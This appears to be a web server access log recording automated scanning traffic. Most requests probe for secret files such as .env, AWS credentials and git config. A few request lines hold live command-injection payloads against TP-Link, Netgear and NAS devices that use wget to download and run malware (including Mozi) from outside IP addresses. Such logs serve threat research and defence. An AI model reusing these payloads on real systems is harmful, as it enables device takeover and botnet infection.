+[0mPOST / [32m200 [0m2.284 ms - 6377[0m
+[0mGET /actuator/health [32m200 [0m0.910 ms - 6377[0m
+[0mGET / [32m200 [0m0.712 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.977 ms - 6377[0m
+[0mPOST / [32m200 [0m0.766 ms - 6377[0m
+[0mGET / [32m200 [0m0.674 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.815 ms - 6377[0m
+[0mPOST / [32m200 [0m0.819 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.794 ms - 6377[0m
+[0mPOST / [32m200 [0m1.347 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.767 ms - 6377[0m
+[0mPOST / [32m200 [0m0.798 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.825 ms - 6377[0m
+[0mPOST /.env [32m200 [0m2.126 ms - 6377[0m
+[0mGET /.aws/credentials [32m200 [0m0.883 ms - 6377[0m
+[0mPOST /.aws/credentials [32m200 [0m18.871 ms - 6377[0m
+[0mGET /.aws/config [32m200 [0m0.866 ms - 6377[0m
+[0mPOST /.aws/config [32m200 [0m9.866 ms - 6377[0m
+[0mGET /aws/credentials [32m200 [0m1.001 ms - 6377[0m
+[0mPOST /aws/credentials [32m200 [0m25.029 ms - 6377[0m
+[0mGET /test.php [32m200 [0m0.936 ms - 6377[0m
+[0mPOST /test.php [32m200 [0m8.957 ms - 6377[0m
+[0mGET /phpinfo [32m200 [0m0.859 ms - 6377[0m
+[0mPOST /phpinfo [32m200 [0m1.089 ms - 6377[0m
+[0mGET /_profiler/phpinfo [32m200 [0m0.955 ms - 6377[0m
+[0mPOST /_profiler/phpinfo [32m200 [0m0.888 ms - 6377[0m
+[0mGET /phpinfo.php [32m200 [0m0.878 ms - 6377[0m
+[0mPOST /phpinfo.php [32m200 [0m20.210 ms - 6377[0m
+[0mGET /info.php [32m200 [0m0.873 ms - 6377[0m
+[0mPOST /info.php [32m200 [0m2.250 ms - 6377[0m
+[0mGET / [32m200 [0m0.898 ms - 6377[0m
+[0mGET / [32m200 [0m0.720 ms - 6377[0m
+[0mGET / [32m200 [0m1.054 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m1.401 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.403 ms - 6377[0m
+[0mPOST / [32m200 [0m0.975 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.883 ms - 6377[0m
+[0mPOST / [32m200 [0m0.791 ms - 6377[0m
+[0mGET / [32m200 [0m0.753 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.861 ms - 6377[0m
+[0mPOST / [32m200 [0m0.794 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.813 ms - 6377[0m
+[0mPOST / [32m200 [0m0.839 ms - 6377[0m
+[0mGET / [32m200 [0m0.663 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.102 ms - 6377[0m
+[0mPOST / [32m200 [0m0.800 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.763 ms - 6377[0m
+[0mPOST / [32m200 [0m0.743 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.820 ms - 6377[0m
+[0mPOST / [32m200 [0m0.793 ms - 6377[0m
+[0mGET / [32m200 [0m0.675 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.711 ms - 6377[0m
+[0mPOST / [32m200 [0m0.767 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.020 ms - 6377[0m
+[0mPOST / [32m200 [0m0.931 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.823 ms - 6377[0m
+[0mPOST / [32m200 [0m0.766 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.024 ms - 6377[0m
+[0mPOST / [32m200 [0m3.265 ms - 6377[0m
+[0mGET /.git/config [32m200 [0m0.837 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.741 ms - 6377[0m
+[0mPOST /.env [32m200 [0m0.750 ms - 6377[0m
+[0mGET /sources/.env [32m200 [0m0.990 ms - 6377[0m
+[0mPOST /sources/.env [32m200 [0m1.021 ms - 6377[0m
+[0mGET /private/.env [32m200 [0m1.529 ms - 6377[0m
+[0mPOST /private/.env [32m200 [0m30.813 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.761 ms - 6377[0m
+[0mPOST / [32m200 [0m0.805 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.154 ms - 6377[0m
+[0mPOST / [32m200 [0m0.925 ms - 6377[0m
+[0mGET /sendgrid/.env [32m200 [0m0.795 ms - 6377[0m
+[0mPOST / [32m200 [0m0.841 ms - 6377[0m
+[0mGET / [32m200 [0m0.632 ms - 6377[0m
+[0mGET /manager/html [32m200 [0m1.026 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.769 ms - 6377[0m
+[0mGET / [32m200 [0m0.692 ms - 6377[0m
+[0mGET / [32m200 [0m0.713 ms - 6377[0m
+[0mGET /wp-content/plugins/kingcomposer/readme.txt [32m200 [0m0.854 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.783 ms - 6377[0m
+[0mPOST / [32m200 [0m0.810 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.943 ms - 6377[0m
+[0mPOST / [32m200 [0m0.919 ms - 6377[0m
+[0mGET /ReportServer [32m200 [0m0.793 ms - 6377[0m
+[0mGET / [32m200 [0m2.408 ms - 6377[0m
+[0mGET / [32m200 [0m0.738 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.814 ms - 6377[0m
+[0mPOST / [32m200 [0m1.282 ms - 6377[0m
+[0mGET / [32m200 [0m0.719 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.819 ms - 6377[0m
+[0mPOST / [32m200 [0m0.753 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.937 ms - 6377[0m
+[0mPOST / [32m200 [0m0.930 ms - 6377[0m
+[0mGET / [32m200 [0m0.703 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.800 ms - 6377[0m
+[0mGET /bloggerApp.js [32m200 [0m1.237 ms - 11732[0m
+[0mGET /sitemap.xml [32m200 [0m1.583 ms - 6377[0m
+[0mGET /robots.txt [32m200 [0m0.788 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.711 ms - 6377[0m
+[0mPOST / [32m200 [0m1.167 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.852 ms - 6377[0m
+[0mPOST / [32m200 [0m0.793 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.929 ms - 6377[0m
+[0mPOST / [32m200 [0m0.813 ms - 6377[0m
+[0mGET /.git/config [32m200 [0m0.887 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.854 ms - 6377[0m
+[0mPOST / [32m200 [0m1.294 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.897 ms - 6377[0m
+[0mPOST / [32m200 [0m0.779 ms - 6377[0m
+[0mGET / [32m200 [0m0.665 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.770 ms - 6377[0m
+[0mPOST / [32m200 [0m0.891 ms - 6377[0m
+[0mGET /.DS_Store [32m200 [0m0.769 ms - 6377[0m
+[0mGET /.git/HEAD [32m200 [0m0.851 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.913 ms - 6377[0m
+[0mPOST / [32m200 [0m0.790 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.777 ms - 6377[0m
+[0mPOST / [32m200 [0m0.800 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.835 ms - 6377[0m
+[0mPOST / [32m200 [0m0.798 ms - 6377[0m
+[0mGET / [32m200 [0m0.725 ms - 6377[0m
+[0mGET / [32m200 [0m0.657 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.223 ms - 6377[0m
+[0mPOST / [32m200 [0m16.112 ms - 6377[0m
+[0mGET / [32m200 [0m0.708 ms - 6377[0m
+[0mGET / [32m200 [0m0.659 ms - 6377[0m
+[0mGET / [32m200 [0m0.688 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.727 ms - 6377[0m
+[0mPOST / [32m200 [0m0.899 ms - 6377[0m
+[0mGET / [32m200 [0m1.135 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.142 ms - 6377[0m
+[0mPOST / [32m200 [0m0.962 ms - 6377[0m
+[0mGET / [32m200 [0m0.681 ms - 6377[0m
+[0mGET / [32m200 [0m0.657 ms - 6377[0m
+[0mGET / [32m200 [0m0.713 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.049 ms - 6377[0m
+[0mPOST / [32m200 [0m0.775 ms - 6377[0m
+[0mGET / [32m200 [0m0.678 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m1.321 ms - 6377[0m
+[0mGET /.env [32m200 [0m4.424 ms - 6377[0m
+[0mPOST / [32m200 [0m1.075 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.841 ms - 6377[0m
+[0mPOST / [32m200 [0m0.800 ms - 6377[0m
+[0mGET / [32m200 [0m0.725 ms - 6377[0m
+[0mGET /.git/config [32m200 [0m0.960 ms - 6377[0m
+[0mGET / [32m200 [0m0.927 ms - 6377[0m
+[0mGET / [32m200 [0m0.801 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.949 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.854 ms - 6377[0m
+[0mPOST / [32m200 [0m0.862 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.766 ms - 6377[0m
+[0mPOST / [32m200 [0m0.755 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.846 ms - 6377[0m
+[0mPOST / [32m200 [0m0.825 ms - 6377[0m
+[0mGET / [32m200 [0m0.643 ms - 6377[0m
+[0mGET /.DS_Store [32m200 [0m0.738 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.840 ms - 6377[0m
+[0mPOST / [32m200 [0m0.801 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.817 ms - 6377[0m
+[0mPOST / [32m200 [0m1.314 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.796 ms - 6377[0m
+[0mPOST / [32m200 [0m0.956 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.134 ms - 6377[0m
+[0mPOST / [32m200 [0m0.748 ms - 6377[0m
+[0mGET / [32m200 [0m0.783 ms - 6377[0m
+[0mGET / [32m200 [0m4.726 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.946 ms - 6377[0m
+[0mGET /geoserver/web/ [32m200 [0m0.842 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.754 ms - 6377[0m
+[0mPOST / [32m200 [0m0.868 ms - 6377[0m
+[0mGET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cm0JLXJmCWxvbAl8CXdnZXQJLU8tCWh0dHA6Ly85NC4xNTYuNzkuMTI5L2xvbHxzaA== [32m200 [0m1.396 ms - 6377[0m
+[0mGET /.vscode/sftp.json [32m200 [0m0.833 ms - 6377[0m
+[0mGET / [32m200 [0m0.944 ms - 6377[0m
+[0mGET /form.html [32m200 [0m0.825 ms - 6377[0m
+[0mGET /upl.php [32m200 [0m0.894 ms - 6377[0m
+[0mGET /geoip/ [32m200 [0m0.852 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m1.454 ms - 6377[0m
+[0mGET /1.php [32m200 [0m0.806 ms - 6377[0m
+[0mGET /bundle.js [32m200 [0m0.896 ms - 6377[0m
+[0mGET /files/ [32m200 [0m1.034 ms - 6377[0m
+[0mGET /systembc/password.php [32m200 [0m0.798 ms - 6377[0m
+[0mGET /password.php [32m200 [0m0.939 ms - 6377[0m
+[0mGET /info.php [32m200 [0m0.894 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.876 ms - 6377[0m
+[0mPOST / [32m200 [0m0.727 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.744 ms - 6377[0m
+[0mPOST / [32m200 [0m0.790 ms - 6377[0m
+[0mGET /.git/config [32m200 [0m1.040 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.787 ms - 6377[0m
+[0mPOST / [32m200 [0m1.056 ms - 6377[0m
+[0mHEAD / [32m200 [0m0.427 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.758 ms - 6377[0m
+[0mPOST / [32m200 [0m0.772 ms - 6377[0m
+[0mGET /.git/config [32m200 [0m0.806 ms - 6377[0m
+[0mGET /.vscode/sftp.json [32m200 [0m0.791 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.766 ms - 6377[0m
+[0mPOST / [32m200 [0m0.735 ms - 6377[0m
+[0mGET / [32m200 [0m0.675 ms - 6377[0m
+[0mGET / [32m200 [0m0.648 ms - 6377[0m
+[0mGET / [32m200 [0m0.663 ms - 6377[0m
+[0mGET /Public/home/js/check.js [32m200 [0m0.834 ms - 6377[0m
+[0mGET /static/admin/javascript/hetong.js [32m200 [0m1.309 ms - 6377[0m
+[0mGET / [32m200 [0m0.641 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.799 ms - 6377[0m
+[0mPOST / [32m200 [0m0.745 ms - 6377[0m
+[0mGET / [32m200 [0m0.980 ms - 6377[0m
+[0mGET / [32m200 [0m0.662 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.024 ms - 6377[0m
+[0mPOST / [32m200 [0m0.823 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.763 ms - 6377[0m
+[0mPOST /.env [32m200 [0m0.758 ms - 6377[0m
+[0mGET /.aws/credentials [32m200 [0m0.974 ms - 6377[0m
+[0mPOST /.aws/credentials [32m200 [0m1.072 ms - 6377[0m
+[0mGET /.aws/config [32m200 [0m1.395 ms - 6377[0m
+[0mPOST /.aws/config [32m200 [0m0.797 ms - 6377[0m
+[0mGET /aws/credentials [32m200 [0m0.814 ms - 6377[0m
+[0mPOST /aws/credentials [32m200 [0m0.757 ms - 6377[0m
+[0mGET /test.php [32m200 [0m0.979 ms - 6377[0m
+[0mPOST /test.php [32m200 [0m0.770 ms - 6377[0m
+[0mGET /phpinfo [32m200 [0m0.797 ms - 6377[0m
+[0mPOST /phpinfo [32m200 [0m10.757 ms - 6377[0m
+[0mGET /_profiler/phpinfo [32m200 [0m1.119 ms - 6377[0m
+[0mPOST /_profiler/phpinfo [32m200 [0m1.472 ms - 6377[0m
+[0mGET /phpinfo.php [32m200 [0m0.843 ms - 6377[0m
+[0mPOST /phpinfo.php [32m200 [0m42.007 ms - 6377[0m
+[0mGET /info.php [32m200 [0m0.812 ms - 6377[0m
+[0mPOST /info.php [32m200 [0m61.647 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.738 ms - 6377[0m
+[0mPOST / [32m200 [0m0.797 ms - 6377[0m
+[0mGET / [32m200 [0m0.771 ms - 6377[0m
+[0mGET /form.html [32m200 [0m1.018 ms - 6377[0m
+[0mGET /upl.php [32m200 [0m0.860 ms - 6377[0m
+[0mGET /geoip/ [32m200 [0m0.860 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m1.605 ms - 6377[0m
+[0mGET /1.php [32m200 [0m0.815 ms - 6377[0m
+[0mGET /bundle.js [32m200 [0m0.828 ms - 6377[0m
+[0mGET /files/ [32m200 [0m0.862 ms - 6377[0m
+[0mGET /systembc/password.php [32m200 [0m0.844 ms - 6377[0m
+[0mGET /password.php [32m200 [0m0.931 ms - 6377[0m
+[0mGET /info.php [32m200 [0m0.827 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.786 ms - 6377[0m
+[0mPOST / [32m200 [0m0.755 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.050 ms - 6377[0m
+[0mPOST / [32m200 [0m0.796 ms - 6377[0m
+[0mGET /.git/config [32m200 [0m0.836 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.007 ms - 6377[0m
+[0mPOST / [32m200 [0m0.842 ms - 6377[0m
+[0mGET / [32m200 [0m0.764 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.790 ms - 6377[0m
+[0mPOST / [32m200 [0m0.860 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.843 ms - 6377[0m
+[0mPOST / [32m200 [0m0.750 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.922 ms - 6377[0m
+[0mPOST / [32m200 [0m1.295 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.858 ms - 6377[0m
+[0mPOST / [32m200 [0m1.333 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.816 ms - 6377[0m
+[0mPOST / [32m200 [0m8.589 ms - 6377[0m
+[0mGET / [32m200 [0m0.723 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.877 ms - 6377[0m
+[0mGET /geoserver/web/ [32m200 [0m0.818 ms - 6377[0m
+[0mGET / [32m200 [0m0.693 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.868 ms - 6377[0m
+[0mPOST / [32m200 [0m0.788 ms - 6377[0m
+[0mGET / [32m200 [0m0.653 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.769 ms - 6377[0m
+[0mPOST / [32m200 [0m0.803 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.814 ms - 6377[0m
+[0mPOST / [32m200 [0m0.782 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.036 ms - 6377[0m
+[0mPOST / [32m200 [0m0.870 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.915 ms - 6377[0m
+[0mPOST / [32m200 [0m0.753 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.837 ms - 6377[0m
+[0mGET /ads.txt [32m200 [0m0.816 ms - 6377[0m
+[0mGET /app-ads.txt [32m200 [0m2.707 ms - 6377[0m
+[0mGET /sellers.json [32m200 [0m0.825 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.926 ms - 6377[0m
+[0mPOST / [32m200 [0m1.355 ms - 6377[0m
+[0mGET / [32m200 [0m0.693 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.757 ms - 6377[0m
+[0mPOST / [32m200 [0m0.855 ms - 6377[0m
+[0mGET / [32m200 [0m0.854 ms - 6377[0m
+[0mGET / [32m200 [0m0.687 ms - 6377[0m
+[0mGET / [32m200 [0m0.714 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.754 ms - 6377[0m
+[0mPOST / [32m200 [0m0.740 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.787 ms - 6377[0m
+[0mPOST / [32m200 [0m0.800 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.751 ms - 6377[0m
+[0mPOST /.env [32m200 [0m515.375 ms - 6377[0m
+[0mGET /.aws/credentials [32m200 [0m0.879 ms - 6377[0m
+[0mPOST /.aws/credentials [32m200 [0m64.210 ms - 6377[0m
+[0mGET /.aws/config [32m200 [0m1.015 ms - 6377[0m
+[0mPOST /.aws/config [32m200 [0m0.766 ms - 6377[0m
+[0mGET /aws/credentials [32m200 [0m1.522 ms - 6377[0m
+[0mPOST /aws/credentials [32m200 [0m0.792 ms - 6377[0m
+[0mGET /test.php [32m200 [0m0.799 ms - 6377[0m
+[0mPOST /test.php [32m200 [0m48.672 ms - 6377[0m
+[0mGET /phpinfo [32m200 [0m0.715 ms - 6377[0m
+[0mPOST /phpinfo [32m200 [0m20.107 ms - 6377[0m
+[0mGET /_profiler/phpinfo [32m200 [0m1.020 ms - 6377[0m
+[0mPOST /_profiler/phpinfo [32m200 [0m166.825 ms - 6377[0m
+[0mGET /phpinfo.php [32m200 [0m0.844 ms - 6377[0m
+[0mPOST /phpinfo.php [32m200 [0m17.501 ms - 6377[0m
+[0mGET /info.php [32m200 [0m0.747 ms - 6377[0m
+[0mPOST /info.php [32m200 [0m14.521 ms - 6377[0m
+[0mGET / [32m200 [0m0.846 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.795 ms - 6377[0m
+[0mPOST / [32m200 [0m0.775 ms - 6377[0m
+[0mGET / [32m200 [0m0.649 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.786 ms - 6377[0m
+[0mGET / [32m200 [0m0.718 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.877 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.718 ms - 6377[0m
+[0mPOST / [32m200 [0m0.762 ms - 6377[0m
+[0mGET / [32m200 [0m0.618 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.754 ms - 6377[0m
+[0mPOST / [32m200 [0m0.933 ms - 6377[0m
+[0mGET / [32m200 [0m0.774 ms - 6377[0m
+[0mGET / [32m200 [0m0.532 ms - 6377[0m
+[0mGET / [32m200 [0m0.729 ms - 6377[0m
+[0mGET / [32m200 [0m0.634 ms - 6377[0m
+[0mGET / [32m200 [0m0.707 ms - 6377[0m
+[0mGET / [32m200 [0m0.558 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.796 ms - 6377[0m
+[0mPOST / [32m200 [0m0.788 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.920 ms - 6377[0m
+[0mPOST / [32m200 [0m0.800 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.100 ms - 6377[0m
+[0mPOST / [32m200 [0m0.776 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.898 ms - 6377[0m
+[0mPOST / [32m200 [0m0.887 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.774 ms - 6377[0m
+[0mPOST / [32m200 [0m5.426 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.152 ms - 6377[0m
+[0mPOST / [32m200 [0m1.204 ms - 6377[0m
+[0mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) [32m200 [0m0.816 ms - 6377[0m
+[0mGET / [32m200 [0m1.101 ms - 6377[0m
+[0mGET /3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/ [32m200 [0m1.251 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.767 ms - 6377[0m
+[0mPOST / [32m200 [0m0.845 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.707 ms - 6377[0m
+[0mPOST / [32m200 [0m0.776 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.851 ms - 6377[0m
+[0mPOST / [32m200 [0m1.252 ms - 6377[0m
+[0mGET / [32m200 [0m0.675 ms - 6377[0m
+[0mGET / [32m200 [0m0.689 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.767 ms - 6377[0m
+[0mGET / [32m200 [0m0.632 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.099 ms - 6377[0m
+[0mPOST / [32m200 [0m0.899 ms - 6377[0m
+[0mGET / [32m200 [0m0.740 ms - 6377[0m
+[0mGET / [32m200 [0m0.874 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.828 ms - 6377[0m
+[0mPOST / [32m200 [0m0.783 ms - 6377[0m
+[0mPOST /boaform/admin/formLogin [32m200 [0m0.775 ms - 6377[0m
+[0mGET / [32m200 [0m0.608 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.784 ms - 6377[0m
+[0mPOST / [32m200 [0m0.860 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.892 ms - 6377[0m
+[0mPOST / [32m200 [0m1.314 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.974 ms - 6377[0m
+[0mPOST / [32m200 [0m0.857 ms - 6377[0m
+[0mGET / [32m200 [0m0.696 ms - 6377[0m
+[0mGET /.env [32m200 [0m4.368 ms - 6377[0m
+[0mPOST / [32m200 [0m0.809 ms - 6377[0m
+[0mGET / [32m200 [0m0.690 ms - 6377[0m
+[0mGET / [32m200 [0m0.667 ms - 6377[0m
+[0mGET / [32m200 [0m0.797 ms - 6377[0m
+[0mGET /form.html [32m200 [0m0.778 ms - 6377[0m
+[0mGET /upl.php [32m200 [0m0.772 ms - 6377[0m
+[0mGET /geoip/ [32m200 [0m0.832 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.866 ms - 6377[0m
+[0mGET /1.php [32m200 [0m0.770 ms - 6377[0m
+[0mGET /bundle.js [32m200 [0m0.877 ms - 6377[0m
+[0mGET /files/ [32m200 [0m0.833 ms - 6377[0m
+[0mGET /systembc/password.php [32m200 [0m0.783 ms - 6377[0m
+[0mGET /password.php [32m200 [0m0.927 ms - 6377[0m
+[0mGET /info.php [32m200 [0m0.761 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.752 ms - 6377[0m
+[0mPOST / [32m200 [0m0.787 ms - 6377[0m
+[0mGET / [32m200 [0m0.663 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.828 ms - 6377[0m
+[0mGET / [32m200 [0m0.684 ms - 6377[0m
+[0mGET / [32m200 [0m0.656 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.110 ms - 6377[0m
+[0mPOST / [32m200 [0m0.756 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.757 ms - 6377[0m
+[0mPOST / [32m200 [0m0.793 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.993 ms - 6377[0m
+[0mPOST / [32m200 [0m1.061 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.784 ms - 6377[0m
+[0mPOST / [32m200 [0m1.155 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.803 ms - 6377[0m
+[0mPOST / [32m200 [0m0.740 ms - 6377[0m
+[0mGET / [32m200 [0m0.597 ms - 6377[0m
+[0mGET / [32m200 [0m0.682 ms - 6377[0m
+[0mGET / [32m200 [0m0.679 ms - 6377[0m
+[0mGET / [32m200 [0m0.615 ms - 6377[0m
+[0mGET /wp-content/plugins/kingcomposer/readme.txt [32m200 [0m0.730 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.838 ms - 6377[0m
+[0mPOST / [32m200 [0m0.760 ms - 6377[0m
+[0mGET / [32m200 [0m0.668 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.745 ms - 6377[0m
+[0mPOST / [32m200 [0m0.841 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.872 ms - 6377[0m
+[0mPOST / [32m200 [0m0.766 ms - 6377[0m
+[0mGET / [32m200 [0m0.645 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.733 ms - 6377[0m
+[0mPOST / [32m200 [0m23.348 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.707 ms - 6377[0m
+[0mPOST / [32m200 [0m0.787 ms - 6377[0m
+[0mGET / [32m200 [0m0.627 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.713 ms - 6377[0m
+[0mPOST / [32m200 [0m0.729 ms - 6377[0m
+[0mGET / [32m200 [0m0.686 ms - 6377[0m
+[0mGET / [32m200 [0m0.623 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.732 ms - 6377[0m
+[0mPOST / [32m200 [0m0.788 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.760 ms - 6377[0m
+[0mPOST / [32m200 [0m0.755 ms - 6377[0m
+[0mGET / [32m200 [0m0.665 ms - 6377[0m
+[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://1.69.17.162:46558/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [32m200 [0m1.072 ms - 6377[0m
+[0mGET / [32m200 [0m0.631 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.848 ms - 6377[0m
+[0mPOST / [32m200 [0m0.761 ms - 6377[0m
+[0mGET /actuator/health [32m200 [0m0.797 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.772 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.745 ms - 6377[0m
+[0mPOST / [32m200 [0m0.807 ms - 6377[0m
+[0mGET / [32m200 [0m0.669 ms - 6377[0m
+[0mGET / [32m200 [0m0.623 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.751 ms - 6377[0m
+[0mPOST / [32m200 [0m2.773 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.739 ms - 6377[0m
+[0mPOST / [32m200 [0m0.705 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.820 ms - 6377[0m
+[0mPOST / [32m200 [0m5.101 ms - 6377[0m
+[0mGET / [32m200 [0m0.713 ms - 6377[0m
+[0mGET / [32m200 [0m0.574 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.102 ms - 6377[0m
+[0mPOST / [32m200 [0m0.796 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.796 ms - 6377[0m
+[0mPOST / [32m200 [0m1.244 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.766 ms - 6377[0m
+[0mPOST / [32m200 [0m0.806 ms - 6377[0m
+[0mGET / [32m200 [0m0.698 ms - 6377[0m
+[0mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) [32m200 [0m0.836 ms - 6377[0m
+[0mGET / [32m200 [0m0.658 ms - 6377[0m
+[0mGET / [32m200 [0m0.636 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.809 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.802 ms - 6377[0m
+[0mPOST / [32m200 [0m1.365 ms - 6377[0m
+[0mGET /hudson [32m200 [0m0.888 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.752 ms - 6377[0m
+[0mPOST / [32m200 [0m0.739 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.758 ms - 6377[0m
+[0mPOST / [32m200 [0m87.526 ms - 6377[0m
+[0mGET http://httpbin.org/ip [32m200 [0m0.822 ms - 6377[0m
